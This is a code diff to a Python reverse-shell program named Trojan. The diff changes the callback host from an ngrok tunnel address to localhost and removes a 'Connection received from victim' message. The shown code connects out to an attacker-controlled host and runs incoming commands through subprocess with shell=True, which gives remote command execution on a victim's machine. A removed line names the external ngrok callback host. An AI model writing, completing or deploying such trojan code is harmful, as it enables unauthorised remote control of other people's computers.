@@ -12,7 +12,7 @@ import payloads
 import ctypes
 
 class Trojan:
-    def __init__(self, target="0.tcp.sa.ngrok.io", port=12744):
+    def __init__(self, target="127.0.0.1", port=8888):
         self.target = target  # your ngrok ip here
         self.port = port
         self.targetAddress = (self.target, self.port)
@@ -68,8 +68,6 @@ class Trojan:
             try:
                 self.trojan = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.trojan.connect(self.targetAddress)
-                msg = '\nConnection received from victim\n'
-                self.trojan.send(msg.encode('utf-8'))
                 self.handleConnection(self.trojan)
             except socket.error as e:
                 print(f"Error: {e}")
@@ -105,7 +103,7 @@ class Trojan:
             if command.strip() == 'cd ..':
                 # Change the working directory one level up
                 chdir('..')
-
+                return ""
             process = subprocess.Popen(
                 command,
                 shell=True,
